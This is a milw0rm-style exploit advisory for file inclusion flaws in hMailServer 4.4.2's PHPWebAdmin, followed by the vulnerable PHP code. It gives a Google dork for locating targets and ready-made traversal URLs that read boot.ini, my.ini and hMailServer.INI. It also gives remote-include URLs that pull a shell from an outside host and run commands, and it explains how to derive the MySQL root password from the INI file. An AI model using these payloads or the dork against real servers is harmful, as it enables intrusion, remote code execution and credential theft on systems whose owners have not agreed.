<html><head><title>hMAilServer 4.4.2 (PHPWebAdmin) File Inclusion Vulnerabilities</title></head><pre>hMAilServer 4.4.2 (PHPWebAdmin) local &amp; remote file inclusion poc
by Nine:Situations:Group::strawdog
--------------------------------------------------------------------------------

our site: http://retrogod.altervista.org

software site: http://www.hmailserver.com/
description: http://en.wikipedia.org/wiki/HMailServer
--------------------------------------------------------------------------------
google dork: &quot;PHPWebAdmin for hMailServer&quot; intitle:PHPWebAdmin -site:hmailserver.com -dork

poc:

regardless of register_globals &amp; magic_quotes_gpc:
http://hostname/path_to_webadmin/index.php?page=background/../../../../../../../../boot.ini%00
http://hostname/path_to_webadmin/index.php?page=background/../../Bin/hMailServer.INI%00
http://hostname/path_to_webadmin/index.php?index.php?page=background/../../MySQL/my.ini%00
http://hostname/path_to_webadmin/index.php?index.php?page=background/../../../../../../../../../Program+Files/hmailserver/Bin/hmailserver.ini%00

with register_globals = on:
(prepare a functions.php folder on somehost.com with an index.html with your shell inside on a php enabled server,
otherwise a functions.php shell on a php disabled one)
http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=http://www.somehost.com/&amp;cmd=dir

with register_globals = on &amp; magic_quotes_gpc = off :
http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=c:\boot.ini%00
http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=http://www.somehost.com/shell.txt%00&amp;cmd=dir
http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=c:\Program+Files\hMailServer\Bin\hMailServer.INI%00
http://hostname/path_to_webadmin/initialize.php?hmail_config[includepath]=../Bin/hMailServer.INI%00

&quot;Bin&quot; folder can be found in a different location, disclose the path by simply calling:

http://hostname/path_to_webadmin/initialize.php

interesting file:

hMailServer.INI - contains two interesting fields:
- the &quot;Administrator password&quot; crypted with md5,
- by having knowledge of that you can calculate the MySQL root password,
  specified in the &quot;password&quot; field.
  You can do this by using the /Addons/Utilities/DecryptBlowfish.vbs script

(*)
vulnerable code, index.php:
&lt;?php


   error_reporting(E_ALL);

   if (!file_exists(&quot;config.php&quot;))
   {
   	echo &quot;Please rename config-dist.php to config.php. The file is found in the PHPWebAdmin root folder.&quot;;
   	die;
   }

   require_once(&quot;config.php&quot;);
   require_once(&quot;initialize.php&quot;);

   set_error_handler(&quot;ErrorHandler&quot;);

   if (is_php5())
      set_exception_handler(&quot;ExceptionHandler&quot;);



   $page = hmailGetVar(&quot;page&quot;);

   if ($page == &quot;&quot;)
      $page = &quot;frontpage&quot;;

   $isbackground = (substr($page, 0,10) == &quot;background&quot;);


   if ($isbackground)
      $page = &quot;$page.php&quot;;
   else
      $page = &quot;hm_$page.php&quot;;

   // Check that the page really exists.
   $page = stripslashes($page);
   if (!file_exists($page))
      hmailHackingAttemp();

   // If it's a background page, run here.
   if ($isbackground)
   {
      include $page; //&lt;------------------------------------------ !!!

      // Page is run, die now.
      die;
   }
...

for clearness, here it is hmailGetVar() function in /include/functions.php:
...
function hmailGetVar($p_varname, $p_defaultvalue = null)
{
	$retval = $p_defaultvalue;
	if(isset($_GET[$p_varname]))
	{
		$retval = $_GET[$p_varname];
	}
	else if (isset($_POST[$p_varname]))
	{
		$retval = $_POST[$p_varname];
	}
	else if (isset($_REQUEST[$p_varname]))
	{
		$retval	= $_REQUEST[$p_varname];
	}
	
	if (get_magic_quotes_gpc())
	   $retval = stripslashes($retval);
	
	return $retval;
}
...

so the &quot;page&quot; argument can be passed by $_GET[], $_POST[] or $_COOKIE[] arrays.
Note the stripslashes(), which disable magic_quotes_gpc on every argument passed.

(**)
initialize.php:
...
$hmail_config['rootpath']		= str_replace(&quot;\\&quot;,&quot;/&quot;,$hmail_config['rootpath']);
$hmail_config['includepath']	= str_replace(&quot;\\&quot;,&quot;/&quot;,$hmail_config['includepath']);
$hmail_config['temppath']		= str_replace(&quot;\\&quot;,&quot;/&quot;,$hmail_config['temppath']);
require_once($hmail_config['includepath'] . &quot;functions.php&quot;);
...


# milw0rm.com [2008-11-06]</pre></html>